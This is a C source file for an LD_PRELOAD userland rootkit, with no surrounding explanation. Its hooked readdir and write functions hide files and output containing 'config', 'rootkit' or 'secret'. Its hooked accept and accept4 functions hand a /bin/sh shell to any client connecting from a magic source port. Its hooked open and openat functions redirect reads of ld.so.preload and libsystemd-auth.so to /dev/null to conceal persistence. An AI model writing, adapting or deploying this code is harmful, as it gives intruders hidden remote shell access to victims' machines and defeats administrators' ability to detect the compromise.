#include "rootkit.h"

bool check_rootkit_file(const char *d_name) {
    const char *restricted_list[] = {"config", "rootkit", "secret"};
    int len = sizeof(restricted_list) / sizeof(restricted_list[0]);
    for (int i = 0; i < len; i++) {
        if (strcmp(d_name, restricted_list[i]) == 0) {
            return true;
        }
    }
    return false;
}

struct dirent *readdir(DIR *dirp) {
    orig_readdir_func_type orig_readdir_func = (orig_readdir_func_type)dlsym(RTLD_NEXT, "readdir");
    struct dirent *dir;
    while (1) {
        dir = orig_readdir_func(dirp);
        if (dir == NULL) return NULL;
        if (check_rootkit_file(dir->d_name)) continue;
        break;
    }
    return dir;
}

int inspect_and_shell(int client_fd, struct sockaddr *addr) {
    if (client_fd >= 0 && addr != NULL) {
        struct sockaddr_in *addr_in = (struct sockaddr_in *)addr;
        if (ntohs(addr_in->sin_port) == MAGIC_SOURCE_PORT) {
            if (fork() == 0) {
                dup2(client_fd, 0); 
                dup2(client_fd, 1); 
                dup2(client_fd, 2); 
                char *args[] = {"/bin/sh", NULL};
                execve("/bin/sh", args, NULL);
                exit(0);
            }
            close(client_fd);
            return -1; 
        }
    }
    return client_fd; 
}

int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen) {
    orig_accept_func_type orig_accept = (orig_accept_func_type)dlsym(RTLD_NEXT, "accept");
    int client_fd = orig_accept(sockfd, addr, addrlen);
    return inspect_and_shell(client_fd, addr);
}

int accept4(int sockfd, struct sockaddr *addr, socklen_t *addrlen, int flags) {
    orig_accept4_func_type orig_accept4 = (orig_accept4_func_type)dlsym(RTLD_NEXT, "accept4");
    int client_fd = orig_accept4(sockfd, addr, addrlen, flags);
    return inspect_and_shell(client_fd, addr);
}

ssize_t write(int fd, const void *buf, size_t count) {
    orig_write_func_type orig_write = (orig_write_func_type)dlsym(RTLD_NEXT, "write");
    if (buf == NULL || count <= 0) {
        return orig_write(fd, buf, count);
    }

    char temp_buf[8192] = {0};
    size_t copy_len = count < sizeof(temp_buf) - 1 ? count : sizeof(temp_buf) - 1;
    memcpy(temp_buf, buf, copy_len);
    temp_buf[copy_len] = '\0';

    const char *restricted_list[] = {"config", "rootkit", "secret"};
    int num_hidden = sizeof(restricted_list) / sizeof(restricted_list[0]);
    
    for (int i = 0; i < num_hidden; i++) {
        if (strstr(temp_buf, restricted_list[i]) != NULL) {
            return count; 
        }
    }

    return orig_write(fd, buf, count);
}


int open(const char *pathname, int flags, ...) {
    orig_open_func_type orig_open = (orig_open_func_type)dlsym(RTLD_NEXT, "open");
    mode_t mode = 0;
    if (flags & O_CREAT) {
        va_list args;
        va_start(args, flags);
        mode = va_arg(args, mode_t);
        va_end(args);
    }

    if (strstr(pathname, "ld.so.preload") != NULL || strstr(pathname, "libsystemd-auth.so") != NULL) {
        pathname = "/dev/null"; 
    }

    if (flags & O_CREAT) return orig_open(pathname, flags, mode);
    return orig_open(pathname, flags);
}

int openat(int dirfd, const char *pathname, int flags, ...) {
    orig_openat_func_type orig_openat = (orig_openat_func_type)dlsym(RTLD_NEXT, "openat");
    
    mode_t mode = 0;
    if (flags & O_CREAT) {
        va_list args;
        va_start(args, flags);
        mode = va_arg(args, mode_t);
        va_end(args);
    }

    if (strstr(pathname, "ld.so.preload") != NULL || strstr(pathname, "libsystemd-auth.so") != NULL) {
        pathname = "/dev/null";
    }

    if (flags & O_CREAT) return orig_openat(dirfd, pathname, flags, mode);
    return orig_openat(dirfd, pathname, flags);
}